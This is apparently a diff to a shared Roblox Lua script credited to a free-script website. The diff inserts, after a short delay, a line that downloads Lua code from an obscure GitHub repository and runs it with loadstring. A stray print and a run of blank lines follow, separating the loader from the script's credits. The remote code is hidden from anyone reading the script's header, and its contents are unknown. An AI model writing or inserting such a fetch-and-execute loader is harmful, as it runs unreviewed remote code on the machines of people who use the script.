@@ -1,3 +1,14 @@
+task.wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/haiiipplheh/woowmm2scriptwoohooo/refs/heads/main/wow.lua"))()
+print("lord")
+
+
+
+
+
+
+
+
 -- Script taken from https://xenoscripts.com website --
 
 -- This is a free and keyless script, enjoy (Credits to orialdev)
